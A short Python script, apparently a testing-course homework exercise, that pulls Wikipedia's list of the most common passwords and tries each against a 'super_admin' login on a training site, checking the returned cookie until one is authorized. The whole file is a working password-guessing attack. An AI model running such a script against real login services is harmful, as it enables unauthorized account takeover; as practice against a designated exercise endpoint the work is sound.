import requests
import justext


page = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
data = justext.justext(page.content, justext.get_stoplist("English"))
for x in data:
    newpass = x.text
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                             data={"login": "super_admin", "password": newpass})
    cookie = response.cookies.values()
    response1 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                              params={"auth_cookie ": cookie})
    if response1.text != "You are NOT authorized":
        print(response1.text)
        print(newpass)







